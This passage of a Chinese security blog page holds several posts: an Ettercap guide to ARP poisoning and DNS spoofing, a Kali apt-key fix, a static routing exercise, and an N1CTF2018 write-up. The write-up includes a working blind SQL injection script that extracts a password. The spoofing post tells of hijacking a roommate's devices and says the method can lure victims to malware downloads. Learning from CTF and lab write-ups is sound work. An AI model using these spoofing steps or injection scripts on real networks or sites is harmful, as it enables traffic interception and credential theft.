</code></pre><p><strong>点击Sniff–&gt;Unified sniffing</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/9ADDfJAl0L.png?imageslim" alt="mark"><br><strong>在这选择wlan0无线网卡，因为kali上网使用的是无线网卡，如果虚拟机插网线桥接，这里选eth0</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/LID0a4lc5G.png?imageslim" alt="mark"><br><strong>接下来点击Hosts–&gt;Scan for hosts,扫描局域网中存活的ip，寻找攻击目标</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/dL74JliCG6.png?imageslim" alt="mark"><br><strong>显示扫到5个主机，点击Hosts list查看</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/K322B8ffKI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/KaHCj7c2HI.png?imageslim" alt="mark"><br><strong>在ip列表里可以看到网关ip192.168.0.1，还有我们的物理机ip192.168.0.103，接下来开始arp欺骗，具体操作将192.168.0.1Add to Target1，将受害PCip192.168.0.103Add to Target2，然后点击Mitm–&gt;ARP poisoning</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/AFd0bJh14I.png?imageslim" alt="mark"><br><strong>勾选第一个</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/L4bIEcmk0f.png?imageslim" alt="mark"><br><strong>ARP欺骗便开始了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/B5B7GA8cl7.png?imageslim" alt="mark"><br><strong>下面开始dns劫持，点击Plugins–&gt;Manage the plugins</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/FlGj1GEkJK.png?imageslim" alt="mark"><br><strong>选择dns_spood插件，便开始dns欺骗了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/fk3Hf84H0D.PNG" alt="mark"><br><strong>我们这时访问百度，就会看到dns已经被劫持，嘿嘿嘿</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/m725g55cLg.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/3L2dAFhm3i.PNG" alt="mark"><br><strong>同时欺骗了室友的电脑和手机也成功，差点没被打死。。。。就是皮</strong></p>
<p><strong>最后说一下，dns劫持这种攻击不仅限于恶作剧，利用这种攻击，我们还可以诱导受害者进入我们构造的恶意软件下载页面，下载恶意软件以让我们对对方的电脑做一些事情</strong></p>
<p><strong>老铁们遇到dns劫持这种恶作剧，打开cmd命令行输入</strong></p>
<pre><code>ipconfig /flushdns
</code></pre><p><strong>刷新dns缓存即可，然后找到那个皮的人。。。</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/19/kali update error/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/19/kali update error/" itemprop="url">解决kali执行apt update时报错</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-19T23:27:48+08:00">
                2018-03-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/kali/" itemprop="url" rel="index">
                    <span itemprop="name">kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="解决kali执行apt-update时报错"><a href="#解决kali执行apt-update时报错" class="headerlink" title="解决kali执行apt update时报错"></a>解决kali执行apt update时报错</h1><p><strong>更新kali时在执行apt update遇到如下错误</strong></p>
<pre><code>Get:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease [30.5 kB]
Err:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease
The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
Reading package lists... Done
Building dependency tree       
Reading state information... Done
945 packages can be upgraded. Run &apos;apt list --upgradable&apos; to see them.
W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
W: Some index files failed to download. They have been ignored, or old ones used instead.
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/9DHI71m4ee.png?imageslim" alt="mark"></p>
<p><strong>解决方法</strong></p>
<pre><code>apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/KGI19B7egm.png?imageslim" alt="mark"></p>
<p><strong>再次执行就可以成功执行了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/m3L1eiGCcd.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/routestatic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/18/routestatic/" itemprop="url">eNSP静态路由配置</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-18T23:32:19+08:00">
                2018-03-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/网络基础/" itemprop="url" rel="index">
                    <span itemprop="name">网络基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong></p>
<h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p>
<p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p>
<h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1
sy
sysname r1
int e0/0/0
ip add 10.10.10.1 24
q
int g0/0/0
ip add 2.2.2.2 30
q
int g0/0/1
ip add 3.3.3.2 30
q

R2
sy
sysname r2
int e0/0/0
ip add 192.168.2.1 24
q
int g0/0/0
ip add 2.2.2.1 30
1
int g0/0/1
ip add 1.1.1.1 30
q

R3
sy
sysname r3
int e0/0/0
ip add 172.16.2.1 24
q
int g0/0/0
ip add 4.4.4.1 30
q
int g0/0/1
ip add 3.3.3.1 24
q

R4
sy
sysname r4
int g0/0/1
ip add 1.1.1.2 30
q
int g0/0/0
ip add 4.4.4.2 30
q
</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p>
<pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p>
<pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p>
<p><strong>PC1到PC2之间的通信配置</strong></p>
<pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p>
<pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1
R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2
</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p>
<pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2
R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1
R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2
R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/N1CTF2018/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/12/N1CTF2018/" itemprop="url">N1CTF2018 77777 writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T10:53:49+08:00">
                2018-03-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index">
                    <span itemprop="name">ctf</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p>
<h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p>
<p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p>
<pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;
</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p>
<p><strong>题目的第二个提示</strong></p>
<pre><code>the flag is `admin&apos;s password`:)
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p>
<pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)
</code></pre><p><strong>数据库语句变为:</strong></p>
<pre><code>update users set points=任意数字 and （构造逻辑判断）
</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p>
<pre><code>import requests
import string
list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用
url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面
#read password
#i=0
#while 1:
#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}
#    html=requests.post(url=url,data=payload).content
#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break
#        print i
#        break
#    else:
#        i=i+1
#password length is 13
#read password
i=0
for i in range(1,14):
    for j in list:
        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}
        html=requests.post(url=url,data=payload).content
        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break
            print j
            break
#flag is HE3L3LOCAT233
</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p>
<p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p>
<p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/LuFei.jpg"
                alt="Lawliet" />
            
              <p class="site-author-name" itemprop="name">Lawliet</p>
              <p class="site-description motion-element" itemprop="description">信息安全技术博客</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.shentoushi.top/index" title="渗透测试师导航" target="_blank">渗透测试师导航</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lorexxar.cn/" title="LoRexxar's Blog" target="_blank">LoRexxar's Blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
                  </li>
                
              </ul>
            </div>
          
          

        </div>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=524543708&auto=0&height=66"></iframe>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Lawliet</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
  

  

  

  

</body>
</html>
